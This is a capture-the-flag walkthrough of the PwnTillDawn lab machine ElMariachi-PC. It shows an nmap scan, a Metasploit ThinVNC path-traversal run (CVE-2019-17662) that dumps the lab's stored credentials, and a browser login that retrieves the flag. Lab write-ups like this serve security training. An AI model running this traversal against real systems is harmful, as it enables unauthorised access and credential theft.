---

title: "ElMariachi-PC - 10.150.150.69"
date: 2022-04-21 01:09:33 +0300
author: oste
image: /assets/img/Posts/ElMariachi-PC.png
categories: [PwnTillDawn, PTD-EASY]
tags: [metasploit, ThinVNC, CVE-2019-17662, THINVNC 1.0B1 PATH TRAVERSAL]
---

We first begin by performing an nmap scan to determine what ports are open and what services are running behind them.

```bash
➜  PWNTILLDAWN nmap -sC -sV -p- -T4 10.150.150.69
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 10:23 EDT
Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 59.09% done; ETC: 10:29 (0:02:16 remaining)
Nmap scan report for 10.150.150.69
Host is up (0.16s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-04-21T15:18:05+00:00; +45m25s from scanner time.
| rdp-ntlm-info:
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-21T15:17:35+00:00
| ssl-cert: Subject: commonName=ElMariachi-PC
| Not valid before: 2022-04-20T13:52:13
|_Not valid after:  2022-10-20T13:52:13
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
50417/tcp open  msrpc         Microsoft Windows RPC
60000/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest:
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="xsj1AAvQ5UDo9kcCC9DlQA==", opaque="dQwMTtxk2a2YM2Qf4DoI35O5R0L08eFaCP"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port60000-TCP:V=7.92%I=7%D=4/21%Time=62616A5D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x2
SF:0text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWW
SF:W-Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20non
SF:ce=\"xsj1AAvQ5UDo9kcCC9DlQA==\",\x20opaque=\"dQwMTtxk2a2YM2Qf4DoI35O5R0
SF:L08eFaCP\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></H
SF:EAD><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x
SF:20requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourReques
SF:t,111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r
SF:\nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEA
SF:D><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Foun
SF:d</H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x
SF:20was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-21T15:17:35
|_  start_date: N/A
|_clock-skew: mean: 45m24s, deviation: 0s, median: 45m24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 534.88 seconds
➜  PWNTILLDAWN
```

We have quite a number of ports open running on higher ports. However, port 60000 stood out as it looks like its running ThinVNC.

> _ThinVNC is a web remote access client.It provides native, secure data transmission using HTTP and SSL. ThinVNC offers three connection modes: Screen Sharing, Remote Desktop (via RDP) and File. Transfer._

Doing some research, we find some vulnerabilities targeting the service. I tried the Directory Traversal POC listed in [rapid7's](https://www.rapid7.com/db/modules/auxiliary/scanner/http/thinvnc_traversal/) site and it worked like a charm. The vulnerability basically allows unauthenticated users to retrieve arbitrary files, including the ThinVNC configuration file which contains the username and password.

```bash
msf6 > search thinvnc_traversal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/thinvnc_traversal  2019-10-16       normal  No     ThinVNC Directory Traversal


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/thinvnc_traversal

msf6 > use 0
msf6 auxiliary(scanner/http/thinvnc_traversal) > options

Module options (auxiliary/scanner/http/thinvnc_traversal):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DEPTH     2                yes       Depth for Path Traversal
   FILEPATH  ThinVnc.ini      yes       The path to the file to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     8080             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   VHOST                      no        HTTP server virtual host

msf6 auxiliary(scanner/http/thinvnc_traversal) > set RHOSTS 10.150.150.69
RHOSTS => 10.150.150.69
msf6 auxiliary(scanner/http/thinvnc_traversal) > set RPORT 60000
RPORT => 60000
msf6 auxiliary(scanner/http/thinvnc_traversal) > exploit

[+] File ThinVnc.ini saved in: /root/.msf4/loot/20220421102214_default_10.150.150.69_thinvnc.traversa_814508.txt
[+] Found credentials: desperado:TooComplicatedToGuessMeAhahahahahahahh
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/thinvnc_traversal) >
```

Awesome, so now we have some creds we can use to login : `desperado:TooComplicatedToGuessMeAhahahahahahahh`. Visiting the site, we get a prompt to input our creds.

![image](https://user-images.githubusercontent.com/58165365/164482229-339b6dfa-2c13-499a-b864-2510a97f3057.png)

Once authenticated, you need to input the machine's IP and hit connect.

![image](https://user-images.githubusercontent.com/58165365/164481582-eafcd75f-70a3-4208-8c53-e45267e4370c.png)

We now get an RDP-like session on the browser and once you navigate to the Desktop, you can easily get the flag.

![image](https://user-images.githubusercontent.com/58165365/164481335-f893504d-ffc6-4a78-920c-bd8bf2ef15ce.png)

Easy peasy😎

![image](https://www.gifcen.com/wp-content/uploads/2022/01/hacker-gif.gif)

Special shout out to the team behind the PTD network:

- [https://www.wizlynxgroup.com/](https://www.wizlynxgroup.com/)
- [https://online.pwntilldawn.com/](https://online.pwntilldawn.com/)
